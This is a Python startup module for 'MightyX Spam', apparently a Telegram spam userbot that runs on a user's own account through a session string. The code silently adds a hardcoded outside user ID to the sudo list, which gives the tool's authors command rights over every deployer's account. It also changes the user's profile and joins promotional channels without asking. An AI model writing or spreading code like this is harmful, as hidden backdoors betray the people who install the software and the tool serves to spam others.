# LΣGΣΠD | @Hey_LEGEND
# In Mighty X Spam | @MightyXSpam
# Kang With Credits Madafaka !!

import os
import sys
import random
import asyncio
import telethon.utils
from telethon.tl import functions
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from decouple import config
from os import getenv
import logging
import time
from telethon.tl.functions.messages import ImportChatInviteRequest


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

mightyversion = "v2.0.6"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_NAME = config("ALIVE_NAME", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
ALIVE_TEXT = config("ALIVE_TEXT", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default=".")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
STRING = config("STRING", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 1517994352 not in SUDO_USERS:
    SUDO_USERS.append(1517994352)
OWNER_ID = int(os.environ.get("OWNER_ID", None))

# owner mention
mention = f"[{ALIVE_NAME}](tg://user?id={OWNER_ID})"

# Don't Mess with Codes !! 
DEV = list(map(int, getenv("FULLSUDO").split()))
if 2007758161 in SUDO_USERS:
    DEV.append(2007758161)
DB_URI = config("DATABASE_URL", None)
DEV.append(OWNER_ID)
SUDO_USERS.append(OWNER_ID)

# Sessions
async def MightyX():
    global Mig
  
    
    if STRING:
        session_name = str(STRING)
        print("String 1 Found")
        Mig = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 1")
            await Mig.start()
            botme = await Mig.get_me()
            await Mig(functions.account.UpdateProfileRequest(last_name="#1"))
            await Mig(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Mig = "STRING"
            print(e)
            pass
    
       
    

loop = asyncio.get_event_loop()
loop.run_until_complete(MightyX())
